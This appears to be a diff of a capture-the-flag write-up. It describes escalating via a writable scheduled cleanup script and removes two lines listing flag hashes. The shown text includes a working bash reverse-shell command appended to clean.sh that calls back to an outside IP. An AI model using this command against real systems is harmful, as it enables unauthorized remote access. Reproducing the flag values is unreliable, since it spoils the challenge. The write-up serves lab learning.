@@ -64,6 +64,3 @@ Among other paths, it is also mounted in `/opt/clean/` in which there's a `clean
 Viewing the contents this looks like it is removing the contents of the /tmp/ directory. I placed some files in the directory and waited. After a short while the files had been removed from the directory.<br />
 So to spawn a reverse shell on my machine, I run `echo "bash -i >& /dev/tcp/10.11.85.53/6666 0>&1" >> clean.sh`, and then wait for the connection: <br />
 ![image](https://github.com/user-attachments/assets/f56dc8cb-e3fc-443e-b21d-988bcc48ff13)<br />
-
-- Flag 1: `7cf90a0e7c5d25f1a827d3efe6fe4d0edd63cca9`
-- Root Flag `4a98e43d78bab283938a06f38d2ca3a3c53f0476`
